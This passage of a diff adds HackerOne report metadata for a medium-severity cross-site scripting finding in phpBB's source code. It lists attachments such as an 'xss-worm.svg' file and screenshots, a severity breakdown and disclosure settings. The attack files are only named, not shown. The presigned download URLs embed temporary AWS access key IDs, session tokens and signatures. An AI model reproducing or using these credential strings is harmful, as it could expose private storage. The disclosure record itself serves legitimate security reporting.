%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8572f1fe3609390f40ca7aae2b8d45e40dca251687d07dde7050fbf9811a777a",
+      "file_size": 262,
+      "type": "image/svg+xml",
+      "moderated": null
+    },
+    {
+      "id": 5541119,
+      "file_name": "xss-worm.svg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/panl5j50oun1ftt6ptkb1x9bf677?response-content-disposition=attachment%3B%20filename%3D%22xss-worm.svg%22%3B%20filename%2A%3DUTF-8%27%27xss-worm.svg&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d340976b51f44fac89e69a17e6bc519f56deaff114dfc6cf5ae0beffb30c28b5",
+      "file_size": 1442,
+      "type": "image/svg+xml",
+      "moderated": null
+    },
+    {
+      "id": 5541120,
+      "file_name": "xss_onload.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8lx0yytkkbg0tgb70t0cjx9bw4je?response-content-disposition=attachment%3B%20filename%3D%22xss_onload.jpg%22%3B%20filename%2A%3DUTF-8%27%27xss_onload.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=31473fc3d4f0b6e82dd14363961a4674b270f388b97eb1c79e99402df9b1af0e",
+      "file_size": 34,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 5541171,
+      "file_name": "Screenshot_2026-03-16_035241.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yk0x76nokchy15y4vuni2f3nqd93?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-03-16_035241.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-03-16_035241.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dace48f79fd18e98eec837765c9a4b1da182431fcac71ef653b57b8031b2848f",
+      "file_size": 106678,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5541174,
+      "file_name": "Screenshot_2026-03-16_053058.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/azkl6quoyb21zo9m6o2qyc7rok4t?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-03-16_053058.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-03-16_053058.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=36af3bf16ce77dc6ba8b69910807052ee44ce2601cc2b13daba309ddb4164bfe",
+      "file_size": 198947,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5541176,
+      "file_name": "Screenshot_2026-03-16_053134.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3yn211dz1m3omfqhpu5ddtr0orbm?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-03-16_053134.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-03-16_053134.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8e99d8f5ed7d3d3def7872cf3a61c968c622c81e173650e80bc2a8f5163ca69f",
+      "file_size": 127375,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5541179,
+      "file_name": "Screenshot_2026-03-16_053211.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/og09qjb4w0m6pt4hok2x92xj25gw?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-03-16_053211.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-03-16_053211.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=63782773aa3d894506a4b04e2a916dd3972b1b744bb367cfc5ef9977da47af0e",
+      "file_size": 109710,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-07-30T20:29:23.774Z",
+  "allow_singular_disclosure_after": -2239.928077724,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "a7mmr",
+    "0xwb17"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 12184,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/phpbb/phpbb",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
